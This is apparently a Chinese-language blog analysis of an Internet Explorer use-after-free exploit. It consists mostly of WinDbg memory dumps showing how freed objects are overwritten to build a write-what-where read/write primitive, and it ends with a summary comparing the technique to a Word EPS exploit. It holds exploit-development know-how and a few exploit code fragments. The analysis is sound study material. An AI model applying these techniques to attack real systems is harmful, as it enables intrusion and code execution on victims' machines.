0:009> dd 0943b5b4-4	//hd2.nodeValue
0943b5b0  0000200c 00000000 06ff1320 00000000
0943b5c0  00000009 00000000 0963cd44 00000000	//fake
0943b5d0  00000009 00000000 09649004 00000000	//arr
0943b5e0  00000003 00000000 12341234 00000000
0943b5f0  00000003 00000000 12341234 00000000
0943b600  00000003 00000000 12341234 00000000
0943b610  00000003 00000000 12341234 00000000
0943b620  00000003 00000000 12341234 00000000
0:009> dd 0963cd44 L8
0963cd44  73705654 73705638 7370562c 73705610
0963cd54  0963fed0 05d40888 00000000 00000002
0:009> dd 0963fed0 L9	//该处正是fake的内存地址
0963fed0  7370514c 08dcc8c0 00000000 00000000
0963fee0  00000000 00000000 00000000 05d4d338
0963fef0  00000100
```

继续执行到flush()处，原本的abf已经存放了fake所在的内存结构：

```
0:009> g
Breakpoint 0 hit
eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
eip=73869e6b esp=05cec538 ebp=05cec5a0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec588={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//flush()
0:009> dd 963ff00 L9	//abf
0963ff00  7370514c 08dcc8c0 00000000 00000000
0963ff10  00000000 095f8ee0 0c770460 05d61fe8
0963ff20  00020010
0:009> dd 05d61fe8 L11*4	//abf中的内容，其中abf[1]中存放的值就是fake
05d61fe8  00000000 00000000 00000000 00000000
05d61ff8  00004003 00000000 0963cd44 00000000
05d62008  00004003 00000000 0963cd48 00000000
05d62018  00004003 00000000 0963cd4c 00000000
05d62028  00004003 00000000 0963cd50 00000000
05d62038  00004003 00000000 0963cd54 00000000
05d62048  00004003 00000000 0963cd58 00000000
05d62058  00004003 00000000 0963cd5c 00000000
05d62068  00004003 00000000 0963cd60 00000000
05d62078  00004003 00000000 0963cd64 00000000
05d62088  00004003 00000000 0963cd68 00000000
05d62098  00004003 00000000 0963cd6c 00000000
05d620a8  00004003 00000000 0963cd70 00000000
05d620b8  00004003 00000000 0963cd74 00000000
05d620c8  00004003 00000000 0963cd78 00000000
05d620d8  00004003 00000000 0963cd7c 00000000
05d620e8  00004003 00000000 0963cd80 00000000
0:009> dd poi(0963cd44+10) L9	//fake
0963fed0  7370514c 08dcc8c0 00000000 00000000
0963fee0  00000000 09609100 00000000 05d4d338
0963fef0  00000100
```

当执行到var ref = new VBArray(hd0.nodeValue)时，查看hd0的内存，发现hd0.nodeValue已经被abf覆盖：

```
0:009> g
Breakpoint 0 hit
eax=0e413ed6 ebx=00ebd201 ecx=7209f6b0 edx=00400040 esi=02000001 edi=00000001
eip=73869e6b esp=05cec7b0 ebp=05cec810 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec7f8={MSHTML!CFastDOM::CNode::Trampoline_cloneNode (7209f6b0)}
0:009> g
Breakpoint 0 hit
eax=0e40dd64 ebx=00ebd201 ecx=7206eb20 edx=40000010 esi=02000001 edi=00000001
eip=73869e6b esp=05cec878 ebp=05cec8dc iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec8c4={MSHTML!CFastDOM::CNode::Trampoline_Get_nodeValue (7206eb20)}	//var ref = new VBArray(hd0.nodeValue)
0:009> dd 05387200 L10	//hd0
05387200  715961ec 00000001 00000001 00000008
05387210  00000000 00000000 0a2f9cf0 00000000
05387220  ffffffff 093b32c4 0000200c 00000000
05387230  06ff1680 00000000 05382370 00000000
0:009> du 093b32c4 
093b32c4  "handle"
0:009> dd 06ff1680 L4
06ff1680  08800001 00000010 00000000 0943b5b0
0:009> dd 0943b5b0		//hd0.nodeValue
0943b5b0  0002000a 00000000 00000000 00000000
0943b5c0  00004003 00000000 0963cd44 00000000
0943b5d0  00004003 00000000 0963cd48 00000000
0943b5e0  00004003 00000000 0963cd4c 00000000
0943b5f0  00004003 00000000 0963cd50 00000000
0943b600  00004003 00000000 0963cd54 00000000
0943b610  00004003 00000000 0963cd58 00000000
0943b620  00004003 00000000 0963cd5c 00000000
```

随后通过setData方法将abf[1]构造成一个ArrayBuffer结构，获取abf[1]到god中，执行到god = new DataView(ref.getItem(1))时，abf的内存结构如下：

![](https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-2-12_22-17-41.png)

write-what-where读写原语构造完毕，随后通过该读写原语获取函数地址，调用最终实现利用。

## 总结

此次利用的手法和之前分析过的word EPS文件漏洞十分相似，EPS和JS都是脚本语言，共同点都是通过UAF来覆盖释放后的内存结构，构造一段读写原语，再通过读写原语写入构造好的write-what-where字符串的结构。通过write-what-where字符串便可以轻松实现函数的获取和调用了。

不同点在于JS对象和EPS的对象结构在内存的布局不同，导致利用时需要了解JS对象的内存布局后才能构造出write-what-where字符串，在EPS中的利用手法如绕过EMET的R3HOOK和EAF可以在IE漏洞中复用。

此次分析大部分的时间花在对各种JS对象内存结构的寻找上，经过查找资料和手动调试，对于ArrayBuffer、Element、Attribute等结构有了深入的了解，下次在分析有这些对象参与的POC和EXP时可以快速的定位到这些对象的内存，同时也找到了对象内置函数的调用位置，可以快速定位代码执行位置和执行结果。
